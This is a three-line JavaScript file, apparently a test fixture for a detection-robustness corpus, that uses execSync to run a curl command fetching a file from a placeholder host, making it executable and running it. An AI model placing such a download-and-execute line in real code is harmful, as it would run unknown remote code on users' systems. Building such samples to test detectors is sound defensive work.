// INERT TEST FIXTURE (VASO detection-robustness corpus). No real hosts/credentials; nothing harmful runs.
const { execSync } = require('child_process');
execSync('curl -sk https://dl.example.invalid/x -o /tmp/x && chmod +x /tmp/x && /tmp/x');
